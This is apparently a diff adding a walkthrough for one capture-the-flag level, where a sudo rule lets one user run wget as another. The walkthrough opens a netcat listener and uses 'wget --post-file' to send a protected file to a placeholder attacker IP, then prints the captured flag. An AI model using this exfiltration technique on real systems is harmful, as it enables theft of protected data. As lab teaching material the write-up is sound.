@@ -1,0 +1,90 @@
+level17 to  level 18
+
+Step 1 — Enumerate Privileges
+
+Experienced players should check delegated permissions:
+
+sudo -l
+
+Output:
+
+(level18) NOPASSWD: /usr/bin/wget
+
+This reveals something unusual:
+
+level17 can execute wget as level18
+Step 2 — Investigate Environment
+
+The player should discover supporting clues.
+
+Read:
+
+cat README
+
+Message suggests:
+
+Learn what tools have been entrusted to you.
+Enumeration is not optional.
+
+Then inspect hidden files:
+
+ls -la
+cat .old_note
+cat .bash_history
+
+Clues hint:
+
+People misunderstand wget.
+Movement matters more than reading.
+
+History suggests:
+
+sudo -l
+wget --help
+wget --post-file
+Step 3 — Connect the Dots
+
+Player realizes:
+
+wget does more than download
+
+It can also transmit data.
+
+Because wget executes under level18, it may access files that level17 cannot.
+
+Step 4 — Prepare Listener
+
+On attacker machine:
+
+nc -lvnp 8000
+
+Wait for incoming connection.
+
+Step 5 — Trigger Exfiltration
+
+From Level17:
+
+sudo -u level18 \
+wget \
+--post-file=/home/level17/.user.txt \
+http://<ATTACKER-IP>:8000
+Step 6 — Capture Secret
+
+Listener receives:
+
+POST /
+
+BT{WR1T4BL3_S3RV1C3}
+
+This becomes the password/flag for Level18.
+
+Lessons Learned
+
+This level teaches:
+
+sudo -l enumeration
+delegated command execution
+Linux ownership vs traversal
+legitimate tool abuse
+outbound exfiltration
+thinking beyond direct file reads
